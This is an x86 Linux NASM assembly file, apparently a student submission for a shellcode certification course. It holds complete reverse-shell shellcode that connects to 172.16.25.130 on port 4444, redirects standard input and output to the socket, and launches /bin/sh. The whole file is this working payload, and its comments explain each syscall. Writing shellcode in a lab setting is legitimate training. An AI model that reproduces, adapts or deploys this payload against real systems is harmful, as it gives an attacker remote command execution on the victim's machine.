; Filename: SLAEreversebindshell.nasm
; Author:  Billy (@_hAxel)
; Website:  https://www.haxel.io
;
;Student ID: PA-7462
;
;
; Purpose: Revers TCP bind shell using /bin/sh connecting to 172.16.25.130 on port 4444

global _start			

section .text
_start:

	xor eax, eax  		; Cleanup eax
	xor ebx, ebx  		; Cleanup ebx
	xor esi, esi  		; Cleanup esi
	xor edi, edi  		; Cleanup edi 
	mov al, 0x66  		; Set al to 0x66 (syscall for socketcall)
	mov bl, 0x1     	; Move 1 to bl, making ebx 1, sys_socket
	push esi      		; Push 0 to stack for arguments - TCP
	push ebx     		; Push 1 to stack for arguments - connection based byte stream
	push 0x2      		; Push 2 to stack for arguments - IP Protocol
	mov ecx, esp  		; Move stack to ecx for syscall
	int 0x80      		; Syscall sys_socket
	mov edx, eax  		; Move the socket file descriptor from syscall to edx
	
	xor eax, eax 		; Cleanup eax
	mov al, 0x66 		; Socketcall syscall
	inc ebx      		; Increment ebx form 1 to 2 (sys bind)
	push 0x821910ac     	; Push 130 25 16 172 to stack, (IP 172.16.25.130)
	push word 0x5c11	; Push 4444 to stack, port for bind
	push bx			; Push 2 to stack, AF_INET
	mov ecx, esp		; Move args to ecx for sys call
	push 0x10		; Address length 16
	push ecx		; args
	push edx		; socket file descriptor
	mov ecx, esp		; args
	inc ebx			; ebx = 0x3 (sys_connect)
	int 0x80		; Syscall sys_connect

	xor ecx, ecx		; Cleanup ECX
	mov cl, 0x2		; Set up ecx for loop
	mov ebx, edx		; Socket file descriptor
	xor eax, eax		; Cleanup EAX

loop:
	mov al, 0x3f		; Sys_dup2
	int 0x80		; Syscall sys_dup2, Setting stderr, stdout, and stdin to socket
	dec ecx			; Decrement ecx for loop and specifing stderr, stdout, stdin
	jns loop		

	xor eax, eax
	mov al, 0x0b		; Syscall - sys_execve
	xor edx, edx
	xor ecx, ecx
	push edx
	push 0x68732f2f 	; hs// 
	push 0x6e69622f		; nib/ pushing /bin/sh to stack, accounting for endianness
	mov ebx, esp		; Save args to ebx
	int 0x80		; final syscall, execve opening /bin/sh
